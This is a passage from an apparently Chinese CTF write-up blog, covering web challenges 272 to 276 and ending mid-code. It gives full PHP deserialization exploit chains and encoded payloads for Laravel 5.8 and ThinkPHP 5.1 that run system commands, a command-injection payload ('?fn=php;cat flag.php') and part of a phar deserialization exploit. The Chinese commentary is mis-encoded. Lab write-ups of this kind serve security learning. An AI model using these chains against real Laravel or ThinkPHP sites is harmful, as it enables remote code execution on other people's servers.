&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>&#123;</span><br><span class="line">        <span class="title class_">class</span> <span class="title class_">PendingBroadcast</span> &#123;</span><br><span class="line">            <span class="title class_">protected</span> $<span class="title class_">events</span>;</span><br><span class="line">            <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$events</span>, <span class="variable">$event</span></span>) </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;events = <span class="variable">$events</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;event = <span class="variable">$event</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span>&#123;</span><br><span class="line">        $<span class="title class_">line</span> = <span class="title class_">new</span> <span class="title class_">PhpParser</span>\<span class="title class_">Node</span>\<span class="title class_">Scalar</span>\<span class="title class_">MagicConst</span>\<span class="title class_">Line</span>();</span><br><span class="line">        <span class="variable">$mockdefinition</span> = <span class="keyword">new</span> <span class="title class_">Mockery\Generator\MockDefinition</span>(<span class="variable">$line</span>,<span class="string">&quot;&lt;?php system(&#x27;cat /f*&#x27;);exit;?&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$evalloader</span> = <span class="keyword">new</span> <span class="title class_">Mockery\Loader\EvalLoader</span>();</span><br><span class="line">        <span class="variable">$dispatcher</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Bus\Dispatcher</span>(<span class="keyword">array</span>(<span class="variable">$evalloader</span>,<span class="string">&#x27;load&#x27;</span>));</span><br><span class="line">        <span class="variable">$queuedcommand</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Foundation\Console\QueuedCommand</span>(<span class="variable">$mockdefinition</span>);</span><br><span class="line">        <span class="variable">$pendingbroadcast</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Broadcasting\PendingBroadcast</span>(<span class="variable">$dispatcher</span>,<span class="variable">$queuedcommand</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pendingbroadcast</span>));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// O%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A25%3A%22Illuminate%5CBus%5CDispatcher%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00queueResolver%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A25%3A%22Mockery%5CLoader%5CEvalLoader%22%3A0%3A%7B%7Di%3A1%3Bs%3A4%3A%22load%22%3B%7D%7Ds%3A8%3A%22%00%2A%00event%22%3BO%3A43%3A%22Illuminate%5CFoundation%5CConsole%5CQueuedCommand%22%3A1%3A%7Bs%3A10%3A%22connection%22%3BO%3A32%3A%22Mockery%5CGenerator%5CMockDefinition%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00config%22%3BO%3A37%3A%22PhpParser%5CNode%5CScalar%5CMagicConst%5CLine%22%3A0%3A%7B%7Ds%3A7%3A%22%00%2A%00code%22%3Bs%3A31%3A%22%3C%3Fphp+system%28%27cat+%2Ff%2A%27%29%3Bexit%3B%3F%3E%22%3B%7D%7D%7D</span></span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">burpæŠ“åŒ…ä¿®æ”¹postå€¼data=O%<span class="number">3</span>A40%<span class="number">3</span>A%<span class="number">22</span>Illuminate%<span class="number">5</span>CBroadcasting%<span class="number">5</span>CPendingBroadcast%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>events%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>Illuminate%<span class="number">5</span>CBus%<span class="number">5</span>CDispatcher%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A16%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>queueResolver%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>BO%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>Mockery%<span class="number">5</span>CLoader%<span class="number">5</span>CEvalLoader%<span class="number">22</span>%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>Di%<span class="number">3</span>A1%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>load%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>event%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A43%<span class="number">3</span>A%<span class="number">22</span>Illuminate%<span class="number">5</span>CFoundation%<span class="number">5</span>CConsole%<span class="number">5</span>CQueuedCommand%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>connection%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A32%<span class="number">3</span>A%<span class="number">22</span>Mockery%<span class="number">5</span>CGenerator%<span class="number">5</span>CMockDefinition%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>config%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A37%<span class="number">3</span>A%<span class="number">22</span>PhpParser%<span class="number">5</span>CNode%<span class="number">5</span>CScalar%<span class="number">5</span>CMagicConst%<span class="number">5</span>CLine%<span class="number">22</span>%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>code%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A31%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>C%<span class="number">3</span>Fphp+system%<span class="number">28</span>%<span class="number">27</span>cat+%<span class="number">2</span>Ff%<span class="number">2</span>A%<span class="number">27</span>%<span class="number">29</span>%<span class="number">3</span>Bexit%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><h1 id="web273-Larvel5-8"><a href="#web273-Larvel5-8" class="headerlink" title="web273(Larvel5.8)"></a>web273(Larvel5.8)</h1><ul><li>payloadå’Œä¸Šé¢˜ä¸€æ ·</li></ul><h1 id="web274-ThinkPHP-V5-1"><a href="#web274-ThinkPHP-V5-1" class="headerlink" title="web274(ThinkPHP V5.1)"></a>web274(ThinkPHP V5.1)</h1><p>ç›´æ¥æœThinkPHP V5.1</p><p>çœ‹æºç å‘ç°æç¤º<code>@unserialize(base64_decode(\$_GET[&#39;data&#39;]))</code></p><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//GETä¼ å‚ shell</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&#x27;shell&#x27;</span> =&gt; <span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&#x27;shell&#x27;</span> =&gt; []];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">        <span class="comment">// è¡¨å•è¯·æ±‚ç±»å‹ä¼ªè£…å˜é‡</span></span><br><span class="line">        <span class="string">&#x27;var_method&#x27;</span>       =&gt; <span class="string">&#x27;_method&#x27;</span>,</span><br><span class="line">        <span class="comment">// è¡¨å•ajaxä¼ªè£…å˜é‡</span></span><br><span class="line">        <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,</span><br><span class="line">        <span class="comment">// è¡¨å•pjaxä¼ªè£…å˜é‡</span></span><br><span class="line">        <span class="string">&#x27;var_pjax&#x27;</span>         =&gt; <span class="string">&#x27;_pjax&#x27;</span>,</span><br><span class="line">        <span class="comment">// PATHINFOå˜é‡å ç”¨äºå…¼å®¹æ¨¡å¼</span></span><br><span class="line">        <span class="string">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">        <span class="comment">// å…¼å®¹PATH_INFOè·å–</span></span><br><span class="line">        <span class="string">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [<span class="string">&#x27;ORIG_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_URL&#x27;</span>],</span><br><span class="line">        <span class="comment">// é»˜è®¤å…¨å±€è¿‡æ»¤æ–¹æ³• ç”¨é€—å·åˆ†éš”å¤šä¸ª</span></span><br><span class="line">        <span class="string">&#x27;default_filter&#x27;</span>   =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// åŸŸåæ ¹ï¼Œå¦‚thinkphp.cn</span></span><br><span class="line">        <span class="string">&#x27;url_domain_root&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// HTTPSä»£ç†æ ‡è¯†</span></span><br><span class="line">        <span class="string">&#x27;https_agent_name&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// IPä»£ç†è·å–æ ‡è¯†</span></span><br><span class="line">        <span class="string">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>,</span><br><span class="line">        <span class="comment">// URLä¼ªé™æ€åç¼€</span></span><br><span class="line">        <span class="string">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = [<span class="string">&#x27;var_pjax&#x27;</span> =&gt; <span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hook = [<span class="string">&#x27;visible&#x27;</span> =&gt; [<span class="variable language_">$this</span>,<span class="string">&#x27;isPjax&#x27;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line"></span><br><span class="line"><span class="comment">// TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJzaGVsbCI7YTowOnt9fXM6MTc6IgB0aGlua1xNb2RlbABkYXRhIjthOjE6e3M6NToic2hlbGwiO086MTM6InRoaW5rXFJlcXVlc3QiOjM6e3M6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo3O2k6MTtzOjY6ImlzUGpheCI7fX1zOjk6IgAqAGNvbmZpZyI7YToxOntzOjg6InZhcl9wamF4IjtzOjU6InNoZWxsIjt9fX19fX0=</span></span><br></pre></td></tr></table></figure><ul><li>ä¼ å‚çš„æ—¶å€™éœ€è¦æ³¨æ„ï¼Œé™¤äº†è¦ä¼ dataè¿˜è¦ä¼ ä¸€ä¸ªä¸Šè¾¹ä»£ç æ ‡æ³¨çš„åœ°æ–¹ï¼Œå†…å®¹æ˜¯è¦æ‰§è¡Œçš„ä»£ç </li></ul><p><strong>payload:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJzaGVsbCI7YTowOnt9fXM6MTc6IgB0aGlua1xNb2RlbABkYXRhIjthOjE6e3M6NToic2hlbGwiO086MTM6InRoaW5rXFJlcXVlc3QiOjM6e3M6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo3O2k6MTtzOjY6ImlzUGpheCI7fX1zOjk6IgAqAGNvbmZpZyI7YToxOntzOjg6InZhcl9wamF4IjtzOjU6InNoZWxsIjt9fX19fX0=&amp;shell=tac /f*</span><br></pre></td></tr></table></figure><h1 id="web275-rce"><a href="#web275-rce" class="headerlink" title="web275(rce)"></a>web275(rce)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$fn</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filecontent=<span class="variable">$fn</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkevil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|\.\./i&#x27;</span>, <span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$this</span>-&gt;filecontent))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;evilfile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;evilfile)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm &#x27;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">new</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">checkevil</span>()===<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">        <span class="title function_ invoke__">copy</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()).<span class="string">&#x27;.txt&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;work done&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;where is flag?&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?fn=php;cat flag.php</code></p><ul><li>å‘ç°æœ‰systemï¼Œè¦æƒ³ä½¿å…¶è§¦å‘ï¼Œevilfileå€¼åº”ä¸ºtrue</li><li>æ‰€ä»¥è¯•ç€æ„é€ payloadï¼Œ<code>?fn=php;whoami</code>ï¼Œå‘ç°å¯ä»¥rce</li></ul><h1 id="web276-pharååºåˆ—åŒ–-ç«äº‰"><a href="#web276-pharååºåˆ—åŒ–-ç«äº‰" class="headerlink" title="web276(pharååºåˆ—åŒ–+ç«äº‰)"></a>web276(pharååºåˆ—åŒ–+ç«äº‰)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$fn</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filecontent=<span class="variable">$fn</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkevil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|\.\./i&#x27;</span>, <span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$this</span>-&gt;filecontent))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;evilfile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;evilfile &amp;&amp; <span class="variable language_">$this</span>-&gt;admin)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm &#x27;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">new</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">checkevil</span>()===<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">        <span class="title function_ invoke__">copy</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()).<span class="string">&#x27;.txt&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;work done&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;where is flag?&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>å‘ç°æœ¬é¢˜åœ¨æ‰§è¡Œå‘½ä»¤çš„æ—¶å€™ï¼Œåˆå¯¹adminçš„å€¼è¿›è¡Œåˆ¤æ–­ï¼Œä¸”adminçš„å€¼æ— æ³•æ§åˆ¶</li><li>ç›®çš„è¿˜æ˜¯è®©å‘½ä»¤æ‰§è¡Œ</li><li><p>å¦‚æœæ˜¯pharåè®®ï¼Œä¼šå¯¹å…¶è¿›è¡Œååºåˆ—åŒ–æ“ä½œ</p></li><li><p>å…ˆç”Ÿæˆä¸€ä¸ªpharåŒ…</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&#x27;1;cat f*&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$evilfile</span>=<span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title function_ invoke__">phar</span>(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ 